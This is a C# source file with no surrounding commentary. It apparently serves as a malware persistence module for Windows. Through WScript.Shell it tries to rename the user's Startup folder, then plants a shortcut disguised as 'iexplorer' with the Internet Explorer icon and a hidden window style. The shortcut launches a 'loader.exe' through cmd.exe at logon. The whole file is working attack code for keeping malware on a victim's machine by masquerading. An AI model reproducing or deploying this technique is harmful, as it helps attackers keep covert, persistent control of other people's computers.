


using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

public class Persist
{
	private static Type m_type = Type.GetTypeFromProgID("WScript.Shell");
        private static object m_shell = Activator.CreateInstance(m_type);
	[ComImport, TypeLibType((short)0x1040), Guid("F935DC23-1CF0-11D0-ADB9-00C04FD58A0B")]
        interface IWshShortcut
        {
            [DispId(0)]
            string FullName { [return: MarshalAs(UnmanagedType.BStr)] [DispId(0)] get; }
            [DispId(0x3e8)]
            string Arguments { [return: MarshalAs(UnmanagedType.BStr)] [DispId(0x3e8)] get; [param: In, MarshalAs(UnmanagedType.BStr)] [DispId(0x3e8)] set; }
            [DispId(0x3e9)]
            string Description { [return: MarshalAs(UnmanagedType.BStr)] [DispId(0x3e9)] get; [param: In, MarshalAs(UnmanagedType.BStr)] [DispId(0x3e9)] set; }
            [DispId(0x3ea)]
            string Hotkey { [return: MarshalAs(UnmanagedType.BStr)] [DispId(0x3ea)] get; [param: In, MarshalAs(UnmanagedType.BStr)] [DispId(0x3ea)] set; }
            [DispId(0x3eb)]
            string IconLocation { [return: MarshalAs(UnmanagedType.BStr)] [DispId(0x3eb)] get; [param: In, MarshalAs(UnmanagedType.BStr)] [DispId(0x3eb)] set; }
            [DispId(0x3ec)]
            string RelativePath { [param: In, MarshalAs(UnmanagedType.BStr)] [DispId(0x3ec)] set; }
            [DispId(0x3ed)]
            string TargetPath { [return: MarshalAs(UnmanagedType.BStr)] [DispId(0x3ed)] get; [param: In, MarshalAs(UnmanagedType.BStr)] [DispId(0x3ed)] set; }
            [DispId(0x3ee)]
            int WindowStyle { [DispId(0x3ee)] get; [param: In] [DispId(0x3ee)] set; }
            [DispId(0x3ef)]
            string WorkingDirectory { [return: MarshalAs(UnmanagedType.BStr)] [DispId(0x3ef)] get; [param: In, MarshalAs(UnmanagedType.BStr)] [DispId(0x3ef)] set; }
            [TypeLibFunc((short)0x40), DispId(0x7d0)]
            void Load([In, MarshalAs(UnmanagedType.BStr)] string PathLink);
            [DispId(0x7d1)]
            void Save();

        }

	private static bool CheckPersistence(string lnkname, string newstartupname)
	{
		string lnkPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs" + @"\" + newstartupname + @"\";
		if (File.Exists(lnkPath + lnkname + ".lnk"))
		{
			return true;
		}
		else
		{
			return false;
		}
	}
	private static void AddPersistence(string lnkname, string newstartupname, string command, string commandarg)
	{
		string path;
		string oldstartup = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\Startup\";
		string newstartup = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\";
		try
		{
			Directory.Move(oldstartup, newstartup + newstartupname);
		}
		catch
		{
			newstartupname = "Startup";
		}
		try
		{
			string lnkPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs" + @"\" + newstartupname + @"\";
			path = lnkPath;
			IWshShortcut shortcut = (IWshShortcut)m_type.InvokeMember("CreateShortcut", System.Reflection.BindingFlags.InvokeMethod, null, m_shell, new object[] { lnkPath + lnkname + ".lnk" });
			shortcut.TargetPath = command;
            		shortcut.Arguments = commandarg;
            		shortcut.IconLocation = @"C:\Program Files (x86)\Internet Explorer\iexplore.exe";
            		shortcut.WindowStyle = 7; // hidden style
            		shortcut.Save();
		}
		catch
		{

		}
	}
	private static void Perst()
	{
		string lnkname = "iexplorer";
		string newstartupname = "Startup";
		string command = @"C:\Windows\System32\cmd.exe";
		string commandargs = @"/c c:\users\issam\desktop\test\loader.exe";
		bool checkp = CheckPersistence(lnkname, newstartupname);
		if (!checkp)
		{
			AddPersistence(lnkname, newstartupname, command, commandargs);
		}
	}
	public static void Main(string[] args)
	{
		Perst();
	}
}
